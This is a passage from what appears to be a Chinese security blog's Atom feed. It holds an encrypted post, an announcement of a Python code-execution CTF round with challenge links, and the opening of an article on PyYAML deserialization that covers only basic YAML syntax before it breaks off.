9942396d5c013edce554b1eb1e7bfdf79df853193edb8f6d3ca7aa771c0f5504a05935974158840cf14a3d5ae963d094d6877a9105e02da610f5e3102c5bbed18e45cc5cc1c0951854b1d14d5102ff9b7a83b7537ee25e106988b4ad4504b49ebeb8762298c831bb99c1133478fd33131c3e8478403c8ac166b11da30d6ae5b6508573607bf9e8771c4b0ca48712872f0f7313192b8caf8ff3e18da35e667be0e37cd4ab474de5a4661ab867e4c279dbf0228e373c30b39c598da048851105a64a9002e4317a54fda64f9b061d23a374a728c53b603008cca6f5baebb1f7d56c1466470923684c266e90261b9132f3c2a40996ff134888349c5108bb53a8788cbd82d330f2c6d67b4db563f2f22993b307467ec80391f571e569f60e44228bffbd8f9f8de6b80752e1ee2643dd859c0616294f38ec5c910113fadb8e0ec66f769eb90a0f434e1c96089956d80b9e6e3a7c193f6bb0069b1137cb600f0b3c2fc6270145901cd997e87bb5d3644abf38d9c643b072014d92517dbdf658a286a98694959a132b10ae3aca208b5ccece3f68c8bb5a206fe948190d208b908aba4b5344ec104b02b4115079a8129169526c0665121ca36aa8c7a755e3cddf68960625738192d99c057d1465e0c8e6ec218ff2d6d2807585afa64814aff24e63dc614be497fc1b3745c5feeb2c37c629aa9f1f86725fc26786895430d096a5c7eff70a34199745c3270738b83493c3214fa30e091f3abbe33dd74419b2576b11b0d49caad6c665a0a46263648cc8ce897ae0b8935db5da7f51d79044751ba3199b7f169bbc3a044b9a194444c9eabd53ee53f6d1d2eb9032398d621494fee99c90db73e000cce59212879893499431af186a77c0164a5aca40f059cddf0a85a0e11c6addb8054cf7a1d55b82bcfab77683420f2114eadefabf20cf15b4ee498f1ad59317c45c9b20c73e8ee3644dc7336d488fed6bb73f328722982496a7ac4fe9e3dd2e55e402be2745257af4d20b25fc378f0d4cce4ef63ef3cb8748f7cf74027e45db779f8a62eb29303614cb7bbe6a8186ac73786f0b1120ba0acc31371557950f800cc8909a1c7c940a7de0ecf2bb20b96aa092c5bf1577c1a760a8f265853446115e77308f816d5974020f8be930fdafdf7da7b254cb8e4a11ecf5ecd14343379eee5911f06eabc9fe606d146346308b285fc756ffb8db9c2a3f38b4359a9e506930ca5ce9ad04c9f3728984a69c49e62973a8fc5680ceb4430d98d9310a42a09a5bb66f30f434a943c34a45fe053d735e2f31d5ddf11b1fe9a8a8ab9299693dc2ae61cca59f277b42de3b0acfcb5fa9a1dad5b3387be84b774a76c94d9e26f1b063abe7f1cd3a10639476ecf36603993bd4d33a5943d00e997af6afe71fa70e2db4a0ea97c4b728a47b8609fd076da76a3efb3141dfcb2382359b7c0bf9ee267b5db2a5e630bd4d170fdd1a7d1762452dc3b08ddbeffd11431b71cb3a2f28b0ce3748110d777a7f5137b6d80ea1c779b27e47bae53dfc2054b448029db616c70f4c5573621b9608d06d9a1445f50180dfb6bf5eac1f8dcce2474f536668e3d6577b377da25dd2decebe5207f418e9fe5e083c72a3b4036e8f848b77cd10a940e9903543fbc843514ef849ad6ea2004de82e55e7d902320ae96015f3ee41a179d2537b58c267b5f03f444c276bc3538d4e8576c6038d075a7421712d5711646034e0a25722c4327bb871cbeb884de63d419d2faee001705f9c3c003b41c272d4e72ea31d40cfe49ff2c669a0c302e4bc33401aefb1264a500ebec6452b460e14d5a13fff349773d1a875eec26ebd5182e514df1603bae6eb8e62b06e6bb6e09eb4922e96ca5d86831359696ba76f6e3a0b9b9d4938db0043287bb5eda59c758251fd87315014dc4045b7f966ff889d5c852e2d2e22c2875b03dc184a37c44355c392206ee8c9adda01a824fbdc0d7f94ec9503cbe469aa59832eb7259fccb6b14d9b57c940794fca413fba49a4671fc824a97b888cd508bb155c45868e24075fee33cfdd34cee63fc07ac88fc0df2c761a3f172c5e757f01cc73680a934f4531441e2bb3bd8eb664fedc29b7143ac71fa5d48680bd909bcec47b9dd080e562f54f6def3ee7805ad55357b958fb1a27cc63c3055d7ff506d55ab73bac8b13e0305cf7d07c53091aba99fe7e8f33af3cc5b0c9d359387510c5740f4b400e3b6fda42bf9d8c50721357f8df13ebaa2af24dbc2270bb7af174561987f2b63f6d79810ffc7efda749abefc048227a439d386bb2eb6a5ced82e3c1d853b9cc814c9e76dc8ad4489458ca027d649773e5dbdb8313c74f4fc5c3765108249a9abb4882e8d5b5ec329651a1ce883bd435f1c65bcc01941767f9719a26fdfb17e3dd77f932b2b8f9973fb49cd0c202661d3c1fd7228ae4d80863f8400e3a82ece75362e2fd56e38edb003733556371c3b04caf4b868e20145f01f0806a6f82e79a5c95e211b54f8ff7da3f6fe22b90e8d37f7a2e8b432bc45b8e3cc8501d1d6892bdac8aa717a3abd5ef7c176a9a5776474a5d8605f1da677a2e39b289c73c357a8024cb265da194036ef81f1da877beae3b30a51a482f9bbf5ea3bf00084a5c1b596557b7be680b49436aef09bf40ebf7287e1c6f09cc0659ec7983dc10fb5f83433dc6cb0fc97364c7cee6dc7cda13eabb457b41792a94773f2febc4d81c29f5fbe846630857f99dfa97f8b332028b71b5e00fbd0ca9c84339998befe1f4a63627d6a0a1e4c97faf8f05e68eae387df8b4a62cdc6e199c9beb73e12ec3e208d7308f564b2e12eba6fc76b232c2e50ef72840ed06d3649b60fb964dc36a4b66f115d59eae6d371a8a3e55b9ef95801f48406620d98bd6cdf90f1aa80a237c387aaa7bdabb5d4feef68ea2f80b44513f10e1906d9dce3fc914031384032dc72adb666287b774b1d73b3ca790bf08e3f76dc8fec2882086ddbd0372b42871b91ce1eaee5022c98c9429dcb58048ea375cbb5d8d4bb0e3a8d1e63b5e4640f5e4bc4373453a6a163872de2f4c57cdf9e500d02febd5e2e6f46abb9d030d5c5560cad3b46237ad8d8456a5394968199ba84377612cf9ff53f8d70373485ff3620d3779b17569ccea9f53eed2e548082b8c588ab428ba8c34d567b5098b39698ab43ebeb64b16802b3ff7f59a4036b3404301ec682dd3019f9d09710bccdf890169c40b3575e4a78340137b333a1e86f0b28a12dc5a49067c4605dc965ea8a15a67acccc5d7ea2a8e9f7d6df841a812825e644d3e71c5edfe2329873b9e272f3b53d74e76b1cded9d11318cdbb03fcbe972b74435d85c5135bbe5433adfbcfe62e6bc969ac1a5a3998f124967233e1ba7e6ce700ca9dffa9dc46b7be3b7487f2eead311aea12685f5f06d8c7a2cffab3334880d2b4b1718a3ef2dec18f47ff5fbdf919aca62e8f3a088ba81a2e1008c822c27e5fbb890886eec6f3737b4ad84928ae88f62a3b3dc536245149b182a72e0027c33c7e7706aaf00a333f9cbcf47cc118f4feaa3b31ca50bee018ef1c2614f787c666761e5c502cb48b0bf547c52ab1b3aa3103744435e36f3a92be907c0e39208d8d145cc48fd43fa7ba986bf1dc8f0199859f0b5c0cf5324d3243cc9dca6c28f6dc7bb03816cbab95ede583063278f277c7abe5df869472d0841ed61db544cb99c46bf92a593d28d269ad8d3f8cc5cd070c29e215aeb85dd5e7eb0d795682e1482abd42ef4dcd60c279a472d517c7a762d744028ad71ce2e92a5cab79b44a4063d7226b6e201bf76268b3685fa1ec3998d88cbdeadb0925be626483105d19c09df5b8b565feb83dd8217fb49b6cb4de011910e1d9028c300d08fd74208a6b1a2186e811764a2094d07a6a7d0c6ba763de8d020bdaa39c880f0019beaeda218a10f0309f72af07ec9c57d6fe26acfe9ebe525f4ccaeea0ddab6f9fb5dd704a9785e2d049b7b8fe6f1f8ac4c609586457cc80d9acf5aed4609e4e122704f823991c9a555c54de241616818b05382cb6e50e78910fe58eb07490fe53fba156e91e29b961375e1a1235e0d3dee92de13e9b377b68cacd80f5c6669daaafe1de5d6a4afccceb6799427eada1acc75aae4231c56526c2f0b7fff7e55330c018f37081e993181b4fee8b40fa84c7905ef3469df97b4005cd9a4ffcd3402cd09238faaa29eafad7f92f27c75733154be43cb799b52b51a0a0c78d9a246fcdb98a142a4585285a73d7179ec03b141135cf38fb450ebac5b9db7290187a93288479c354fcdf3419d9393bf3b66535f56c556804db0bda188945de05bb318cece48493acb1a2256e6dd498ba1ac973f704117db8094757bbb08f4a6aa279085bfe0a04f41e301d64403e9bef375cf3539204018231d4dcd87667f5b09f557090edac04f4854f47744fc3ae0c3bad92893e3e743ebb6bb00644cc26a43c7ccab6787b469c756fbfbfbc110b8b57112f6e05ad9340e0036df6c738452c852282c8ea1da529801fffb1f76673e4addb072c9a7f27ac3ad34c1cb5c9ceaf555d97606dc81538b1c0bfb5126443375ddcff5b7dd41db93018034e64ad9b52e47ee3adaeaaecdf4adf0e5cab91afee39850f83ae3c04c4e52d50a2af2e8faca4e4d45b93d0b8641e1dd9c421926434268c3b0077df774c222c5441eaec7181c6635f5636e7bbbe157f702e8a4d10b478bea1639847d95167be6244fe8d2f10545bae0d75b52edfd18f427a934787abee710b6e12508dddfbbe0c1993d06c17b37ed7f74f8c6c498ff09f438026d912e08c52b82ea7c9502bc6c93828921df220159bbc976b266678db0e751c184da75d489aee8e878acda1067496e7162d177f1b617415fff0944daf01c5ee09027098e9366b12e35cf956ddd66d760bbb67eaf60c1757575e1a38b8d12fba3ff4a26d9fd2de792adf6ceb37e12de483e9a024ef6cb002d93a843aa9e9f38af84955809b348f6c492f86ba7842e99950a7055380309ee9b6d96f7ebc1dab4572af897df3776e409e8609bc6463de39714fdf138f14b1a17d8b823c2ba37bb34b15d499d249a6ddd5247b4faa9719510e383a22ad76bf95931645a84843afcd271b3c9978eb3e74e735fffcf7ee367d7667a053c8098945ee99f7f71630bc04b7231bf5100ad57c07af7bcb3fd693e6c22d89f24607400e491bc30d271c52dfb07a6d570d04438af884567e8787886fb8debd121f2054eb4b3486249ba315c993a716f3cb02aecb627af5b07223d896a89cdd3a2c4a4ce82f057e9b6843953f32fb0dcd045d6a9bf407032919837a8d12f9cab0fe60547805a6a1c2370cdf0334a0a9612e9df025c09e1a6365425c49b6609a10e132af120203792aa93416285db2c757134882f4ca3048180691d871961d66b1d4c553d63102b0347b4c8a6261fb6fa43a6f846057d19194b1017e8ad00fae2699614f6dbe3862996a6c39e5187ca8771c0f80a801087b9ee3f7f4f992e5eb8f0d8a4f17b6287953758375420621d4fca22ec27e273fa70c41c6077b3299a099e509aea07c3e1bb2124df606e7bb75eda39d81b488f85a7e2274bbc3cb358df46d0f8d74be46b70f925e79c7d2ca890b8d52ccc3e1ec548a55d32b0a4fe526e1f81142a88b66654cd5372d7002a6384fd8dcc3ca350cd17d48222c5c6487b9c75b52335a0819f8d5aec62426472f8c6a29fbc3eb46f72962101c47f6b521f0435ba7b2a16cefd39e754f2b14868b2eaef66e166582b9bf836a3b9fdce889a412d3cdba92f25f7b22cd52942d5d84f60452425f25339389b193ee21540c120154eaf9d8185cdc1736849f7b0eb50529da37a13b50d3c98b802cd6354a8c2ecea0e96d0e75f48e58645a1a7cf4dfef8d58ba73fef39d9c7abf07030d76b39fa7e99b64b477de6088676f73f42ea0886327860ffff3132fbfe4e0dbfd45fd13a71a0189ef027bd5cd8dbb63f170f08611c4a003eeeb2bd639ddbfceadbbdedc2eef77a6e3c04d669f35d2c3366b237cf82a10cb956c9a897bf48a1a835bfb73555e386fab872ff27ef5fccd8e5f97df9919c9bda8e5af7dbea9b2c72b1e06b1b995b456820de25bb978d93ca3619591a8bda40eab70dc1cbcb86c926799dc25756f661d54270de5a4ae2a67d734dcefd3ac4c166684ececd14fc40635a6da0381c750fcf12f2c981a1e9356cb61f428ceecff79c242bf0fd3cf438fbfd7022b8509da71eb29b82ac1540396028bd5255d3b26b0a2346caac3110085b0c32261e68769ccf39563cbe5c11c87e0d8c3e99ca169c3202e4b07a204a46506f1aa8dc0cbb7d1e999503a0b9c6d46a5297ff4bb991b4bc44aa41238f91b535d242530548db5a5a32b5c7f8e0ac88719bfc822551243390d232f1774f2aac4ecf61ad1aad024fc2f0f00bbaa6e9d7fc131bb60acddc5344b114f8deda248ee7df90c2c1960a98e8f4685cadf4f0590035bf2e4e4fdeba970a68dd8641e06ca971d935ebb12fe721a2f302e094b09590da410fa3f82890f6df7d2ea45ded4f64a0a91257e3db27de77b5d5261e3fe3f0ff364a7e7912376a6c0db9e93d7f2d87686cb2d8379411142ed63a566ff548e0bcc5932ee00549d474eefa6ef937e797941daecde5a74ee5bdc6d2cf026a6ee7e51d5ed462b03de0e50180b41f20b8f314a3a746d151f9245fa40558819702e2fda3aabc9d636db4efbc0cc824b91f5551316bc99a39614ef8179ebb2d50a2b020eff606fb089a6c30a326db77c8777f474afd912661ba7448407b95d53c9ddd8375731d6afcb4f5034f97edb96185ed13ff1e9516b8d3d4bd0ecb73d3178398c3323cfc6a9abce46f066694beecafd7f55199e841d61dd67769ccbe7b5174f0b1b7de730daad4a6e4eb55e41aac0e4176f82df3d071fc9c2c19dcab925e0a9107869bc18fb43844d23c561e679ceebfff1a7e551b3448616cb127e308bb7007ecfb8ae6992dc0f125a0650f38d1afe662091d3e543dd4737fcf69a9a3812cbf49c3314e34fcd5cff69ff8c5864856d68f31275b6d99ab3ae5910c6e59581ae71f23bac41a9762bb1e2fedccf89d3876b11e036887109f2e30b2909c241e1716e0772c5afe5e497b21bca45aca2790a55787572345128d0861030b55c85f3a6fab570931df06dc1ed69799d423593ce02ba29968c3dd754119f6382c074eb99aa860f050f043f9daee718b073c4eb6b33ede674ed7dc2dafe686af81bbf0d4aed8d35a5761989efe846078c6ac9d8a1b1f7c10eadf8bbdf47443944c276b05bbd294ae68e41a39b2fa4aa07279633ca333ddf6064a992af49e2622231bf577e600502c30ceff2345a3c4fb5f71bac32c0e61e45dd89793e8911f6d6f621a13437ea79a6300c074a1b0274d6d7b507e556f44404e15a8823241ad564e019164d376a95f02e8dc80471c2e844aad69ac607849ed064d12c316f31ff0803f8bedd3da800eef075d30db6afa96be878a1b1994a54093ec9539ce43b09923a7f09c0c4090b0be3270439a3d748d452fb0b853bcd167db99d1d190ef937b46527659a2448510e4750eeb3f4ea471eee01f56276437754d78c0e675042dbce3f8b09caab2c957a15d0a1bb4888c8fb50447455361d88f7174f6f3756a792fdcc5f358b81d859745db2371513097f1fb6377859ed77a3bf80d1e66b25c9789e4a95acebc8c93e1845fda23ce4504d793307eab5da46fe51694e118258349a01a6422848a916ba1b461aa99376091861483ce214f5bba76564d533931ede45328c01edf4ba760524f9a5540cc99154d0435b6f59b164c7c5b20874409dea871d33650232f670f84761b288a1b055e4bf81af412ea271566cb4bda784a3c1442f13b4dc1e6d5d7b84085f7cedc4beb7da1106e53afa448fe250d8f0f6659574b408beb497702e04d695799897fb87b8c80e9478cf7e9d1bba05b7cce830109d56381b6c2bec685206dd6d2cb750f3f96b318a72344036e10bbb56f2faba2abe158cae591ec6a2936f5f41e17e11696d7f3d18ffda5937669bb3415337e34c7d068382dc55c12ef107b4cdf421798dd84fab3735994bd0337d4895df16ee8b1a8e17ac3ecde03c3f551d834961d4c82ff2f0e4950f285d6f819f440c688bf960d8ee2e76c1bb56726c16d9a522451d886eaa2205931dd96b5d48822646e2e471d95a4645cba4b2f6c0875a02ec59f93ed4f017ca8b23d007d53f072ae02d74795ca36f3bce2491d7911fc50d9bf297bf6c5317b24b5426edd54c1f5d1726beff91f8d1931db26cfc4d00fb80f57f48202e582dd3417f9b54e7ce261fddedbb44f028016bcd4177b347620a3cebe43b03b8484d42085e94786d5ed095252e9a764abd52f1581844611c0e36de6eddf90aa2bf5fa20f7909504a2f97cd0438490c528bf19ff843f17b2777035694b6272a67e663d7fdf136755c4ea31f32a35fc47278cf902315fea440141ec65fc9edd87eeef1d377f1d5628c8311ce8df0734375d40dbbd39da1749d9054b50a9c4dd904bfc30e26caaed964cbb3e61578da8aa8392ff48d4a175d954a8a078ba90a8f6e87c85028384da8be2411328836010183a946fe6d69f02e1dbae6c318083dc0e6f9b9cb3bfe1c9a933cce183fd32fcc81c1979a7acac72d4f5bfe1eab9de9d65fad1166f05c7069b44deb88c31b6f8c6a55895b990af37493a03ab89f918dc0605f6867449ad45ceedc1a78b1692be375737d69cd0b2da84b371416e1147b1d54da4d7fa76628b21726c257339334f052ec6043b1030d0c93bf09cf1c94e9071fa18fe2768f8cb04748ce06f5a9d3a778bb4c61f89e5b53a6d8b2c12776db148975d03b60bc03399cf4289d3e2119da2e998c2d70efe9987a8fabdd0e1936644bbaa2be8faeac3421771c07c310d64f9b4a1872d494e8325754d4eba96a063c3c81eedc93444ab99b8e75c316c10660284f243eb7a2408b15da1df3e3477e712b1f76a4a287146505b2baecf5bae834d0a5a581d65bcec740c563233010a26f4886fde8a03b06579ddf5b4f651fc12b9ab7b601b5ce8baff872dcb22acc04bfe4e956c8e9c1f3289abf9aa6a8cabca9b3867dd4e942559d7c324d26f28156fa326e5f8defee49e6e6d217b450e07e1b6f3663c07aac557efd1a981787887875358ad826f2bf363a735e5a80b1a908331d781e57537b3a8e1348af219a1513a49ce2e6572f9b8323d6550a36846691c4b73cbc77a6e937b98528a9b4baaeac467a3b2b515286972873770413ce4d64cdc681fe5b9c29964f4c339f9d9f0f2e538edad773b2b916915a69c6cda6b0c2057a2f80b85b772b88c4a7f6571ac547e1fc1d553c0d90c8ae015a60c5a8e128b076fae520cda8b97ff0b4d8486403fe5c0e1284bceb24b349a05147e7a6bea39bda9ec374338086e082d591a73e01a6fcc486e1e1b0a73950521ab65cffbd33a3cdc5a9d2bc7aeba780da19e877a4aa0376eb59ca7794c447132eeb574a9fa7e8cb4466d8e3724952f26c831e54368657a076e11262c4e12b1e243676a9fd1a2a51dc02f845cc0c5a8593cd5cd6bc8a7f61c6908c8a8f70dae14dbb284e4e60a397b1ff9ff596dd419670cb0be5f29db559df9b6aa827c57b4902adb5dfb316e5084702b0959bf5080f9e8d36e7ab3b53e9be75a4bdcd4344f7b8f1899c6543523fd834e985b9d40b242ade2a4e0ff7df27dd9882fc0a4baaacdd723f1b6ca87f31259bd65748f028eef740c71af8b8b332e44d174b46e3670cc8b95b34ab964e637fb12540f43007a7e83ffe36aac5e7c5ac88ae85249bb6d9bfa04d6453abbf21e3a8a8ed50a1b6d1b9ed8dacf76f0d36ca92119a06814cd580e63a3d891cc4c1b2f26ab9490a8c0fc2dbb59443a4c9eba06b7f3f626c7fb8a2c9d69d06ded8449daae743d354d176eea38f77cbd4e6cd2093a0160934b9f2eb409599c745d269bd47822adc520b4be9582605ceb4f286b86e9944880aa69cb75c341f29f3fe5eaf9773ce360e7149c16c186b4ab48f04c2df959ab64e3e8b4f884e2b769887fa029b318911a5d26bfaaf4bcca72dbdac3ba533e05b56515bc00f50efa38063f1a4811dd6ddf83555922984d27543fd9e2312cdb7d01e850c34ca541cbac24a55d53c246bb8c381cad93b3114aaf0325e7714385e77fd5b2b23bec16673b565438a5c9d5ea3cb8f87e43ca4434ac65a32f2c23b79706733fc89a8b3846867d96b7b0555be1b0146a378abdf5f1eb445ad578d5ef8da24de3a0046a2c4bc4dae0a7bfa67387b0dd96a75abf25992fbfa812219321b5e53111536db2ebdf7574688d146ba08048eee0b57c33eafeefcba21e71b7253a572d493eabb5054b90b08c0be8dd72e24e7a58aa67a35edf822f06bcb5da550977f7cc945466bbd7c7f829b2b314b1c504d6f14d2dd89df8dfe43c7f0958273b66fd32e039ac6fbbbfb2ca5648cc2bcd214fdc2b3e96fc41332e70a6acce991e33d0f8190c3a00139f9d8ed83aa9d1b2def5b3af063f801c58ef7016c983f5b5761e733df0b0bbc8202f2a15f8d743753dd5c8fac22b8a0178f5408b086255aaf03d176176c6c07f6aa7f87d484ad38a18740b8d7e6518eb8b757fb3d226eed87c655b63964c47b11c05d34c15d1b900a38fa24b8524c45ee99689d7697df77a2a81825ce36c5196b551a721fcd67d8e05cf3d5b5e39608be453c6dad2d3509f71705dd583683ddc4df9c3c822d1dfe25ec90eb07090b04de7544a3341f9f24627da529ea134eb79a6edf1cbb33e75894a92bbb70c44d5426e6b6dceacf8eca7f06ce813cde6c643e0acd427e92069c96520f5040e5945b4102d2528b3aec080d7b13a80d044a64a89f0edc3f28239f920be9ab507d8028b27f1026f7a43b224c7bc978bbd8d8bd99e1974307783795f4e5bb7922dfb00db3634e511559afdad5bf8bdf553d45caba6653e8586af84c561d4be8d1d25d5523a50310c2050664574d15c569409210ecd1d7a96fb7cef3e10ad2756772a873f3eaf3d08ca36d63f1040f948cd920db04c2bdb8b7ec70cd7dd7d1ea9b8d943b57b1a272277542134c1de3df3a84454e0f2b5e5ace3ac302c796a65959176e4efe4d6cee4a04d73e549af0425d34ef8c7b2f8bc1f10848a14966b9bd66fa57c0b36832b38c877cf2501569381647c5f8080e6bcad9c9b725895f3cba36e633afd2be9dc0825497a110d9ae0af7f0cb7253e676605c59950e26a21b0bc31ec1dcf999b234f4df614dbc98c1855b6ab0c5e662438a9cb25a22aa0f34a0884e1669871b9c4ae90c4ec881347243a64d0550c9d64970cb58893510eef50a3e17c22b4d350bec4505ce3b62057918eec856f79afb524dcfde5c975494ad4a6d22fc89284bb870bc7cd0eaa9e84a1c9817f5895427eb5ea81f3c57857c443664e24f3c554f342f4546a136db24ef03ba73e97aaf92cc07ac1f0f19420908f7227d2b069835578919654e1f5e772502a7254e28cc51b761e5417626a6e5703cf425864189633d98cd6522746b292222a22191ec483dd73747330bf63214e3babcc6dbe8feef591abeb5a3b9033bf6101dd6d1b6e2287151d0ca407c1471925484a3b73d51a2018c0d56ddf6738c47cf04081aa88ccb73a276e385fc6f896b21c06269dbe1b65c68b993bd8dec9a7ed1d51fc5e5e257f5aac293a829fe20c56166f61e3369d145b08601f7241adb67624010522b9152b31eaf31c03d22c573fe5a83b6a671921d12031bf2a9844256472686f4d24807aab23474b9fbb56773da047deb367a08552d81d74e39e453217ec074e607ee57314b9dffc847f85bcb48cd23867ca3a89b38464d18572d72f4c747e3841f50667081b8c78bada0dca45cd57a13721e293dbde27ff2b95953e6fbd7868281415356c1ed5282fe4ebc0d8c093e0b0fa624fefa01d2ab43ebaa608a55644bdf413d2a5ee380a2fd2bc68f615ad8e3b0072c1e3eedfa2b43d3b455cc0bb078951d223841675233d224842b1c10f50697b8e53b3ca43a8c3306107dfb025b1c1988cc79e913ff3b1fa2a23648839daad6e46edf222db22dfc3c1c74a83dcf5efda637483383c1c0e46777e26153a30cdfe1d6696d3cc477fbb436ca8d9d9ebe132b5699b50448166a6e491c38c9fa54cf9e90dc20a8d00af89e549bd08aaaa936ac1fddce29a8296edf15ab1e6b3a6da96927816735aac1fa5f1d445b46d263f8408294dc866a2981b96e4c576befe2a9da34432a07f6815490f21d3c42ee99b683a163d796ef412c6f1edaffa838cb9c1af1d54e4c16fa241da8a66685a9ee05963178488530dcdee394b0fea503a8d25a1693f6f63236b6255c52af94ae2d60a4b5bf8e86d0d9270429ef42de3ba9345d751cbccae5877b4884910d7ae93df7bfb05a5922af54f1ba6e5408d7d33ca6aa9d1e36c9183b93f770c7af975c9a7bf93f3801dd040adc4b6fabd267cdaf21405fc15e9aa617b60ab29515af80a94403aba41183e6d599489eba827b92b01639985271a8e88c2e02839599120c52ec0ed405310040b00dc7c528a7119568942cefe0d1ddead2fad1b8ece32a23519b587aa67d78deabd0764f7b092c8fbe3778a6f920b72c783f8e3246ff50b4662bdc1584bf1701c83047a391db1a268e006f3ff8d5a8accdf4d26fae69489ebd8e760ef3fb289c697f9e0c57a6d4a3f64df70a6db0c687f4801f45a8f7298e133f0b86e31e30e9c92725c3f79f025c240eeb25ec629d9ab3ac</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">come on, b♂y</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">公众号发送 OrangeKiller_CTF_2 来获取密码</summary>
    
    
    
    <category term="活动" scheme="https://www.tr0y.wang/categories/%E6%B4%BB%E5%8A%A8/"/>
    
    
    <category term="CTF" scheme="https://www.tr0y.wang/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>OrangeKiller CTF 第 2 期</title>
    <link href="https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2/"/>
    <id>https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2/</id>
    <published>2022-06-27T19:00:00.000Z</published>
    <updated>2023-05-04T09:44:57.348Z</updated>
    
    <content type="html"><![CDATA[<p>5 题高质量题目，本期的主题是 Python + 代码执行</p><span id="more"></span><p>第 1 期没有部署在线上，只有代码不好玩，所以从本期开始，都部署在线上了。首次访问可能稍微有点慢。</p><p>由于我比较懒，题目描述就不写了，所以把题目弄成了可自解释的形式，所有所需的信息、源码、writeup 链接等都在页面里。题目考点也比较明显，不需要花大量时间理解考点。</p><p>have fun!</p><h2 id="题目">题目</h2><h3 id="less-is-more">less is more</h3><p>一共 3 题：</p><ul><li>less is more</li><li>less is more's revenge</li><li>less is more's re-revenge</li></ul><p>题目链接：https://evil-eval-1.herokuapp.com/</p><h3 id="call-me-baby">call me baby</h3><p>一共 2 题：</p><ul><li>call me baby</li><li>call me baby's revenge</li></ul><p>题目链接：https://ez-python-exec-1.herokuapp.com/</p><h2 id="奖励">奖励</h2><p>一份成就感以及 5 个新的姿♂势</p><p>注：writeup 也在博客里</p><br><p style="text-align: center;"><font size="2px" color="gray">heroku 真香</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;5 题高质量题目，本期的主题是 Python + 代码执行&lt;/p&gt;</summary>
    
    
    
    <category term="活动" scheme="https://www.tr0y.wang/categories/%E6%B4%BB%E5%8A%A8/"/>
    
    
    <category term="CTF" scheme="https://www.tr0y.wang/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>SecMap - 反序列化（PyYAML）</title>
    <link href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/"/>
    <id>https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/</id>
    <published>2022-06-06T20:40:00.000Z</published>
    <updated>2023-05-04T09:44:57.352Z</updated>
    
    <content type="html"><![CDATA[<p>上半年假期过完咯。</p><span id="more"></span><p>YAML 相信橘友们都接触过。YAML 最常见的用途之一是创建配置文件。相比 JSON，因为 YAML 有更好的可读性（比如可以加注释），对用户更友好。我的博客用的是 hexo，它的配置就是通过 YAML 实现的。</p><h2 id="基础知识">基础知识</h2><p>这里简单说一下 YAML 支持的基础语法，若想更加深入了解语法规则，请移步 Google 搜索。</p><h3 id="基础语法规则">基础语法规则</h3><p>基础语法规则有以下几种：</p><ol type="1"><li>一个 .yml 文件中可以有多份配置文件，用 <code>---</code> 隔开即可</li><li>对大小写敏感</li><li>YAML 中的值，可使用 json 格式的数据</li><li>使用缩进表示层级关系</li><li>缩进时不允许使用 tab（<code>\t</code>），只允许使用空格。</li><li>缩进的空格数目不重要，只要相同层级的元素左侧对齐即可。</li><li><code>#</code> 表示注释，和 Python 一样</li><li><code>!!</code> 表示强制类型装换</li><li>可以通过 <code>&amp;</code> 来定义锚点，使用 <code>*</code> 来引用锚点。<code>*</code> 也可以和 <code>&lt;&lt;</code> 配合，引用时会自动展开对象，类似 Python 的 <code>**dict()</code></li><li>YAML 支持的数据结构有三种<ol type="1"><li>对象：键值对的集合</li><li>列表：一组按次序排列的值</li><li>标量（scalars）：原子值（不可再拆分），例如 数字、日期等等</li></ol></li></ol><p>下面通过 YAML 内容与 PyYAML 解析之后的结果对比，可以清晰地了解 YAML 到底配置了啥：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml<br><br>yaml.load(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span 